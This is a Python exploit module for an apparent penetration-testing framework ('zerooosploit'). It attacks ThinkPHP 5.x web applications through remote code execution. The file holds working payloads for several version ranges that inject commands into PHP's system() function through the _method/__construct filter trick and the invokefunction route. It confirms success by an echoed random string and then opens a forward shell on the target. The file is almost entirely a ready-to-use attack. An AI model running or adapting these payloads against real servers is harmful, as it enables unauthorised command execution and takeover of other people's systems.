from zerooosploit.exploits import ExploitAggregate
from zerooosploit.httpclient import HttpClient
from zerooosploit.printer import *
from zerooosploit.shell import TakeControl


class Zerooosploit(ExploitAggregate):

    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            'Name': 'Thinkphp 5x全版本远程代码执行漏洞',
            'Module': 'exploits/thinkphp/tp5x-rce',
            'Product': 'thinkphp',
            'Cve': '',
            'Create_date': '2019-09-18',
            'Description': '',
            'Authors': '01sec',
            'References': ''
        }

        self.option = {
            'url': {'Current Setting': 'http://127.0.0.1:8080/', 'Required': 'yes', 'Description': 'The target url'}
        }

    def exploit(self):
        url = self.get_options('url')
        randomstr = self.randomstr()
        vul_param = 'echo {}'.format(randomstr)
        # <= 5.0.13
        tp5013 = {'s': '{}'.format(vul_param),'_method': '__construct', 'method': '', 'filter[]': 'system'}
        # 5.0.21-5.0.22
        tp5022 = url + '/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=' + vul_param
        # 5.0.23
        tp5023 = {'_method': '__construct', 'filter[]': 'system', 'method': 'get', 'server[REQUEST_METHOD]': '{}'.format(vul_param)}
        # 5.1.*
        tp51 = url + '/?s=index/\\think\Request/input&filter=system&data=' + vul_param
        explist = [tp5013, tp5022, tp5023, tp51]
        for i in range(len(explist)):
            if type(explist[i]) == dict:
                res = HttpClient().send_request_cgi(method='POST', url=url, data=explist[i])
                if res is not None:
                    if randomstr in res.text:
                        print_green('[+] Exploit succeed')
                        TakeControl(res).forward_shell(vul_param)
                        break
                    else:
                        print_red('[-] {0} {1}'.format(url, res.status_code))
                        print_white(res.text)

            else:
                res = HttpClient().send_request_cgi(method='GET', url=explist[i])
                if res is not None:
                    if randomstr in res.text:
                        print_green('[+] Exploit succeed')
                        TakeControl(res).forward_shell(vul_param)
                        break
                    else:
                        print_red('[-] {0} {1}'.format(url, res.status_code))
                        print_white(res.text)

        print_blue('[*] Exploit completed')

